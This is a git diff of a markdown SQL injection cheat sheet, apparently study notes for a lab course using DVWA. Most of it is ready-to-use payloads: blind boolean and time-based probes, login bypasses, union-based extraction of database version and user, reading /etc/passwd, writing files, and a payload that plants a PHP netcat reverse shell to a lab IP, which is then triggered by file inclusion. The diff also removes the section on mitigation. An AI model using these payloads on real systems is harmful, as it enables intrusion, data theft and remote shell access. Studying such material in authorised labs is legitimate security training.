@@ -3,26 +3,17 @@
 ## Types
 - MySQL
   - Error Based
-    - Union Query
-      - Discovery: ```'``` & ```"``` & ```\``` & ```)``` & tilda
-      - Exploitation (SEC542 - 5)
-    - Double Query (SEC542 - 5)
+    - ```'``` & ```"``` & ```\``` & ```)``` & tilda
   - Blind 
-    - Boolean (SEC542 - 5) 
-    - Time Based (SEC542 - 5)
-
-
-- MSSQL
-  - Union Query
-    - ```union all select``` 
-  - Blined Based
-    - ```id=1' and 1=1--+```
-    - ```id=1' and 1=1#```
-  - Time Based
-    - ```id=1' and waitfor delay "00:00:10"```
-  - Error Based
-    - ```id=1 and 1=@@version--```
-    - ```id=1 and 1=db_name()--```
+    - Boolean
+      - True: ```id=1" and 1=1--```
+      - False: ```id=1" and 1=2--```
+      - Other
+        - ```id=1' and 1=1--+```
+        - ```id=1' and 1=1#```  
+    - Time Based
+      - ```id=1' and sleep(5)--```
+      - ```id=';waitfor delay '0:0:5'--```
 
 ## Payloads
 ```
@@ -46,6 +37,7 @@ IF(0,name,age)
 - Login
   - username: ```admin'#``` 
   - password: ```1' or 1=1#``` 
+
 - Data Extracting 
   - Seleting database version, Database, user
     - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
@@ -60,6 +52,7 @@ IF(0,name,age)
     - ```... union select null,load_file('/etc/passwd'),null,null,null``` 
   - Writing files
     - ```UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*``` 
+
 - Shell upload 
   - Payload 
     - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
@@ -67,6 +60,7 @@ IF(0,name,age)
     - nc -vv -l -p 8080
   - Run backdoor
     - ```10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php```
+
 - Tips
   - TRUE statements
     - ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1``` 
@@ -79,15 +73,7 @@ IF(0,name,age)
     - ```/*``` & ```//``` & ```#``` & ```%23```
     - Sometimes you might need to add ';' before the comment
       - ```anD 1=1//``` => ```anD 1=1;//```
+
 ## Tool
 [SQLMAP](../Tools/sqlmap.md)
-
-## Mitigation
-- Secure Code for login in PHP
-```PHP
-$query = "SELECT * FROM accounts WHERE username='".
-$conn->real_escape_string($username).
-"'AND password='".
-$conn->real_escape_string($password).
-"'"
 ```
